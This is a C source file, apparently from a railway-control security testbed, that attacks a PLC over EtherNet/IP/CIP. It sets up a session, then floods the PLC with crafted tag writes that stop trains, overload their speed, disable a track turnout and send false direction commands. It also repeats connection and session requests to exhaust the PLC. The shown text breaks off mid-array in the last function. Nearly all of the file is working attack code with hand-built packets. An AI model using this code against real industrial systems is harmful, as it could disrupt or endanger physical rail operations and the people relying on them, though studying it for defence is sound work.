/* Flood PLC.c
	It is used to send a flood of messages to PLC
	Write by Xuelei Wang
	29/05/2018
*/
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_NONSTDC_NO_WARNINGS
#define  _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>     /* Note: winsock2.h has included windows.h */
#include <conio.h>  //Include keyboard listening function kbhit()
#include <time.h>
#include "reference.h"

SOCKET        HMI007;   /* defined in winsock2.h */
byte sendMessageStr[100]; /* message to be sent to server */
byte SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4;	/*session handle value*/
byte ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4;		/*connection ID*/
byte CIPCount1 = 0xfa, CIPCount2 = 0x00;
char  recvBuffer[100], input = 0;
int sendStatus, recvStatus;

void DisableSpeed(void);
void KeepRequest(void);
void KeepConnect(void);
void OverLoadSpeed(void);
void DisableTrackSwitch(void);
void FalseDirectionCommand(void);

WSADATA       wsa_data;           /* defined in winsock2.h */
struct sockaddr_in PLC;     /* defined in winsock2.h */
struct hostent     *host = NULL;  /* defined in winsock2.h */

int main(void)
{
	for (;;)
	{
		if (kbhit())				// if any input from the keyboard
		{
			input = getch();
			switch (input)
			{
				//DisableTrackSwitch	(press x or X)
			case 88: DisableTrackSwitch(); break;
			case 120: DisableTrackSwitch(); break;
				//OverLoadSpeed		(press o or O)
			case 79: OverLoadSpeed(); break;
			case 111: OverLoadSpeed(); break;
				//KeepRequest		(press r or R)
			case 82: KeepRequest(); break;
			case 114: KeepRequest(); break;
				//DisableSpeed		(press s or S)
			case 83: DisableSpeed(); break;
			case 115: DisableSpeed(); break;
				//KeepConnect		(press c or C)
			case 67: KeepConnect(); break;
			case 99: KeepConnect(); break;
				//FalseDirectionCommand (press f or F)
			case 70: FalseDirectionCommand(); break;
			case 102: FalseDirectionCommand(); break;

			default: break;
			}
		}
	}
	return 0;
}



void DisableSpeed(void)
{
	printf("======== Begin to disable the speed function ========\n\n");
	if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
	{
		puts("WSAStartup failed!");
		exit(1);
	}


	HMI007 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (HMI007 == INVALID_SOCKET)
	{
		printf("Failed to create socket(): %d\n", WSAGetLastError());
		exit(1);
	}

	PLC.sin_family = AF_INET;
	PLC.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in reference.h */
	PLC.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in reference.h */

	/* Connect to PLC */
	if (connect(HMI007, (struct sockaddr *)&PLC, sizeof(PLC)) == SOCKET_ERROR)
	{
		printf("connect() failed: %d\n", WSAGetLastError());
		exit(1);
	}

	listen(HMI007, 8);
	//Ask for session handle
	byte Rgsession[] = { 0x65, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x44, 0x56, 0x41, 0x4e, 0x43, 0x45, 0x44, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
	sendStatus = send(HMI007, Rgsession, 28, 0);
	// Receive session handle number
	recvStatus = recv(HMI007, recvBuffer, 128, 0);
	// Store session handle number
	SessionHandle1 = recvBuffer[4];
	SessionHandle2 = recvBuffer[5];
	SessionHandle3 = recvBuffer[6];
	SessionHandle4 = recvBuffer[7];
	recvBuffer[recvStatus] = 0x00; /* '\0' */

	//Ask for connection ID
	byte connetionmanager[] = { 0x6f, 0x00, 0x40, 0x00, SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x30, 0x00, 0x54, 0x02, 0x20, 0x06, 0x24, 0x01, 0x07, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x41, 0x52, 0x43, 0x48, 0x49, 0x45, 0x02, 0x00, 0x00, 0x00, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0xa3, 0x03, 0x01, 0x00, 0x20, 0x02, 0x24, 0x01 };
	sendStatus = send(HMI007, connetionmanager, 88, 0);
	// Receive connection ID
	recvStatus = recv(HMI007, recvBuffer, 128, 0);
	//Store connection ID
	ConnectionID1 = recvBuffer[44];
	ConnectionID2 = recvBuffer[45];
	ConnectionID3 = recvBuffer[46];
	ConnectionID4 = recvBuffer[47];
	recvBuffer[recvStatus] = 0x00; /* '\0' */

	for (;;)
	{
		// Press Esc to escape the loop
		if (kbhit())				// if any input from the keyboard
		{
			input = getch();
			if (input == 27)		// if is Esc
				break;
		}
		//outside stop
		byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x29, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x15, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
			0x06, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0a,	/*Data Size*/
			0x54, 0x72, 0x61, 0x69, 0x6e, 0x31, 0x5f, 0x4f, 0x66, 0x66, /*Train1_off*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

		sendStatus = send(HMI007, sendMessageStr1, 65, 0);
		CIPCount1++;

		byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x29, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x15, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
			0x06, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0a,	/*Data Size*/
			0x54, 0x72, 0x61, 0x69, 0x6e, 0x31, 0x5f, 0x4f, 0x66, 0x66, /*Train1_off*/	0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

		sendStatus = send(HMI007, sendMessageStr2, 65, 0);
		CIPCount1++;

		//inside stop
		byte sendMessageStr3[] = { 0x70, 0x00,	/*Send Unit Data*/		0x29, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x15, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
			0x06, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0a,	/*Data Size*/
			0x54, 0x72, 0x61, 0x69, 0x6e, 0x32, 0x5f, 0x4f, 0x66, 0x66, /*Train2_off*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

		sendStatus = send(HMI007, sendMessageStr3, 65, 0);
		CIPCount1++;

		byte sendMessageStr4[] = { 0x70, 0x00,	/*Send Unit Data*/		0x29, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x15, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
			0x06, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0a,	/*Data Size*/
			0x54, 0x72, 0x61, 0x69, 0x6e, 0x32, 0x5f, 0x4f, 0x66, 0x66, /*Train2_off*/	0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

		sendStatus = send(HMI007, sendMessageStr4, 65, 0);
		CIPCount1++;
	}
}

void KeepRequest(void)
{
	printf("======== Begin to keep sending requests ========\n\n");
	for (;;)
	{
		// Press Esc to escape the loop
		if (kbhit())				// if any input from the keyboard
		{
			input = getch();
			if (input == 27)		// if is Esc
				break;
		}

		if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
		{
			puts("WSAStartup failed!");
			exit(1);
		}


		HMI007 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (HMI007 == INVALID_SOCKET)
		{
			printf("Failed to create socket(): %d\n", WSAGetLastError());
			exit(1);
		}

		PLC.sin_family = AF_INET;
		PLC.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in reference.h */
		PLC.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in reference.h */

		/* Connect to PLC */
		if (connect(HMI007, (struct sockaddr *)&PLC, sizeof(PLC)) == SOCKET_ERROR)
		{
			printf("connect() failed: %d\n", WSAGetLastError());
			exit(1);
		}

		listen(HMI007, 8);
		//Ask for session handle
		byte Rgsession[] = { 0x65, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x44, 0x56, 0x41, 0x4e, 0x43, 0x45, 0x44, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
		sendStatus = send(HMI007, Rgsession, 28, 0);
		// Receive session handle number
		recvStatus = recv(HMI007, recvBuffer, 128, 0);
		// Store session handle number
		SessionHandle1 = recvBuffer[4];
		SessionHandle2 = recvBuffer[5];
		SessionHandle3 = recvBuffer[6];
		SessionHandle4 = recvBuffer[7];
		recvBuffer[recvStatus] = 0x00; /* '\0' */

		//Ask for connection ID
		byte connetionmanager[] = { 0x6f, 0x00, 0x40, 0x00, SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x30, 0x00, 0x54, 0x02, 0x20, 0x06, 0x24, 0x01, 0x07, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x41, 0x52, 0x43, 0x48, 0x49, 0x45, 0x02, 0x00, 0x00, 0x00, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0xa3, 0x03, 0x01, 0x00, 0x20, 0x02, 0x24, 0x01 };
		sendStatus = send(HMI007, connetionmanager, 88, 0);
		// Receive connection ID
		recvStatus = recv(HMI007, recvBuffer, 128, 0);
		//Store connection ID
		ConnectionID1 = recvBuffer[44];
		ConnectionID2 = recvBuffer[45];
		ConnectionID3 = recvBuffer[46];
		ConnectionID4 = recvBuffer[47];
		recvBuffer[recvStatus] = 0x00; /* '\0' */

		closesocket(HMI007);
	}
}

void KeepConnect(void)
{
	printf("======== Begin to keep connecting and closing ========\n\n");
	for (;;)
	{
		// Press Esc to escape the loop
		if (kbhit())				// if any input from the keyboard
		{
			input = getch();
			if (input == 27)		// if is Esc
				break;
		}

		if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
		{
			puts("WSAStartup failed!");
			exit(1);
		}


		HMI007 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (HMI007 == INVALID_SOCKET)
		{
			printf("Failed to create socket(): %d\n", WSAGetLastError());
			exit(1);
		}

		PLC.sin_family = AF_INET;
		PLC.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in reference.h */
		PLC.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in reference.h */

		/* Connect to PLC */
		if (connect(HMI007, (struct sockaddr *)&PLC, sizeof(PLC)) == SOCKET_ERROR)
		{
			printf("connect() failed: %d\n", WSAGetLastError());
			exit(1);
		}
		closesocket(HMI007);
	}
}

void OverLoadSpeed(void)
{
	printf("======== Begin to overload speed ========\n\n");
	if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
	{
		puts("WSAStartup failed!");
		exit(1);
	}


	HMI007 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (HMI007 == INVALID_SOCKET)
	{
		printf("Failed to create socket(): %d\n", WSAGetLastError());
		exit(1);
	}

	PLC.sin_family = AF_INET;
	PLC.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in reference.h */
	PLC.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in reference.h */

	/* Connect to PLC */
	if (connect(HMI007, (struct sockaddr *)&PLC, sizeof(PLC)) == SOCKET_ERROR)
	{
		printf("connect() failed: %d\n", WSAGetLastError());
		exit(1);
	}

	listen(HMI007, 8);
	//Ask for session handle
	byte Rgsession[] = { 0x65, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x44, 0x56, 0x41, 0x4e, 0x43, 0x45, 0x44, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
	sendStatus = send(HMI007, Rgsession, 28, 0);
	// Receive session handle number
	recvStatus = recv(HMI007, recvBuffer, 128, 0);
	// Store session handle number
	SessionHandle1 = recvBuffer[4];
	SessionHandle2 = recvBuffer[5];
	SessionHandle3 = recvBuffer[6];
	SessionHandle4 = recvBuffer[7];
	recvBuffer[recvStatus] = 0x00; /* '\0' */

	//Ask for connection ID
	byte connetionmanager[] = { 0x6f, 0x00, 0x40, 0x00, SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x30, 0x00, 0x54, 0x02, 0x20, 0x06, 0x24, 0x01, 0x07, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x41, 0x52, 0x43, 0x48, 0x49, 0x45, 0x02, 0x00, 0x00, 0x00, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0xa3, 0x03, 0x01, 0x00, 0x20, 0x02, 0x24, 0x01 };
	sendStatus = send(HMI007, connetionmanager, 88, 0);
	// Receive connection ID
	recvStatus = recv(HMI007, recvBuffer, 128, 0);
	//Store connection ID
	ConnectionID1 = recvBuffer[44];
	ConnectionID2 = recvBuffer[45];
	ConnectionID3 = recvBuffer[46];
	ConnectionID4 = recvBuffer[47];
	recvBuffer[recvStatus] = 0x00; /* '\0' */

	for (;;)
	{
		// Press Esc to escape the loop
		if (kbhit())				// if any input from the keyboard
		{
			input = getch();
			if (input == 27)		// if is Esc
				break;
		}

		byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x32, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x1e, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
			0x09, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x10,	/*Data Size*/
			0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x53, 0x70, 0x65, 0x65, 0x64, 0x32, 0x5f, 0x54, 0x61, 0x67, /*Train_Speed2_Tag*/	0xc4, 0x00, 0x01, 0x00, 0x98, 0x25, 0x00, 0x00 /*Specific Data*/ };

		sendStatus = send(HMI007, sendMessageStr1, 74, 0);
		CIPCount1++;

		byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x32, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x1e, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
			0x09, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x10,	/*Data Size*/
			0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x53, 0x70, 0x65, 0x65, 0x64, 0x31, 0x5f, 0x54, 0x61, 0x67, /*Train_Speed1_Tag*/	0xc4, 0x00, 0x01, 0x00, 0x98, 0x25, 0x00, 0x00 /*Specific Data*/ };

		sendStatus = send(HMI007, sendMessageStr2, 74, 0);
		CIPCount1++;
	}
}

void DisableTrackSwitch(void)
{
	printf("======== Begin to disable track switch ========\n\n");
	if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
	{
		puts("WSAStartup failed!");
		exit(1);
	}


	HMI007 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (HMI007 == INVALID_SOCKET)
	{
		printf("Failed to create socket(): %d\n", WSAGetLastError());
		exit(1);
	}

	PLC.sin_family = AF_INET;
	PLC.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in reference.h */
	PLC.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in reference.h */

	/* Connect to PLC */
	if (connect(HMI007, (struct sockaddr *)&PLC, sizeof(PLC)) == SOCKET_ERROR)
	{
		printf("connect() failed: %d\n", WSAGetLastError());
		exit(1);
	}

	listen(HMI007, 8);
	//Ask for session handle
	byte Rgsession[] = { 0x65, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x44, 0x56, 0x41, 0x4e, 0x43, 0x45, 0x44, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
	sendStatus = send(HMI007, Rgsession, 28, 0);
	// Receive session handle number
	recvStatus = recv(HMI007, recvBuffer, 128, 0);
	// Store session handle number
	SessionHandle1 = recvBuffer[4];
	SessionHandle2 = recvBuffer[5];
	SessionHandle3 = recvBuffer[6];
	SessionHandle4 = recvBuffer[7];
	recvBuffer[recvStatus] = 0x00; /* '\0' */

	//Ask for connection ID
	byte connetionmanager[] = { 0x6f, 0x00, 0x40, 0x00, SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x30, 0x00, 0x54, 0x02, 0x20, 0x06, 0x24, 0x01, 0x07, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x41, 0x52, 0x43, 0x48, 0x49, 0x45, 0x02, 0x00, 0x00, 0x00, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0xa3, 0x03, 0x01, 0x00, 0x20, 0x02, 0x24, 0x01 };
	sendStatus = send(HMI007, connetionmanager, 88, 0);
	// Receive connection ID
	recvStatus = recv(HMI007, recvBuffer, 128, 0);
	//Store connection ID
	ConnectionID1 = recvBuffer[44];
	ConnectionID2 = recvBuffer[45];
	ConnectionID3 = recvBuffer[46];
	ConnectionID4 = recvBuffer[47];
	recvBuffer[recvStatus] = 0x00; /* '\0' */

	for (;;)
	{
		// Press Esc to escape the loop
		if (kbhit())				// if any input from the keyboard
		{
			input = getch();
			if (input == 27)		// if is Esc
				break;
		}

		byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
			0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0b,	/*Data Size*/
			0x54, 0x75, 0x72, 0x6e, 0x6f, 0x75, 0x74, 0x5f, 0x36, 0x5f, 0x33, /*Turnout_6_3*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

		sendStatus = send(HMI007, sendMessageStr1, 67, 0);
		CIPCount1++;

		byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
			0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0b,	/*Data Size*/
			0x54, 0x75, 0x72, 0x6e, 0x6f, 0x75, 0x74, 0x5f, 0x36, 0x5f, 0x33, /*Turnout_6_3*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

		sendStatus = send(HMI007, sendMessageStr2, 67, 0);
		CIPCount1++;

		byte sendMessageStr3[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
			0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0b,	/*Data Size*/
			0x54, 0x75, 0x72, 0x6e, 0x6f, 0x75, 0x74, 0x5f, 0x36, 0x5f, 0x33, /*Turnout_6_3*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

		sendStatus = send(HMI007, sendMessageStr3, 67, 0);
		CIPCount1++;
	}
}

void FalseDirectionCommand(void)
{
	printf("======== Begin to send false command of direction ========\n\n");
	if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
	{
		puts("WSAStartup failed!");
		exit(1);
	}


	HMI007 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (HMI007 == INVALID_SOCKET)
	{
		printf("Failed to create socket(): %d\n", WSAGetLastError());
		exit(1);
	}

	PLC.sin_family = AF_INET;
	PLC.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in reference.h */
	PLC.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in reference.h */

	/* Connect to PLC */
	if (connect(HMI007, (struct sockaddr *)&PLC, sizeof(PLC)) == SOCKET_ERROR)
	{
		printf("connect() failed: %d\n", WSAGetLastError());
		exit(1);
	}

	listen(HMI007, 8);
	//Ask for session handle
	byte Rgsession[] = { 0x65, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x44, 0x56, 0x41, 0x4e, 0x43, 0x45, 0x44, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
	sendStatus = send(HMI007, Rgsession, 28, 0);
	// Receive session handle number
	recvStatus = recv(HMI007, recvBuffer, 128, 0);
	// Store session handle number
	SessionHandle1 = recvBuffer[4];
	SessionHandle2 = recvBuffer[5];
	SessionHandle3 = recvBuffer[6];
	SessionHandle4 = recvBuffer[7];
	recvBuffer[recvStatus] = 0x00; /* '\0' */

	//Ask for connection ID
	byte connetionmanager[] = { 0x6f, 0x00, 0x40, 0x00, SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x30, 0x00, 0x54, 0x02, 0x20, 0x06, 0x24, 0x01, 0x07, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x41, 0x52, 0x43, 0x48, 0x49, 0x45, 0x02, 0x00, 0x00, 0x00, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0xa3, 0x03, 0x01, 0x00, 0x20, 0x02, 0x24, 0x01 };
	sendStatus = send(HMI007, connetionmanager, 88, 0);
	// Receive connection ID
	recvStatus = recv(HMI007, recvBuffer, 128, 0);
	//Store connection ID
	ConnectionID1 = recvBuffer[44];
	ConnectionID2 = recvBuffer[45];
	ConnectionID3 = recvBuffer[46];
	ConnectionID4 = recvBuffer[47];
	recvBuffer[recvStatus] = 0x00; /* '\0' */

	for (;;)
	{
		// Press Esc to escape the loop
		if (kbhit())				// if any input from the keyboard
		{
			input = getch();
			if (input == 27)		// if is Esc
				break;
		}

		//inside
		byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
			0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
			0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x32, 0x5f, 0x4f, 0x6e, 0x5f, 0x32, /*Train_2_on_2*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

		sendStatus = send(HMI007, sendMessageStr1, 67, 0);
		CIPCount1++;
		Sleep(10);

		byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
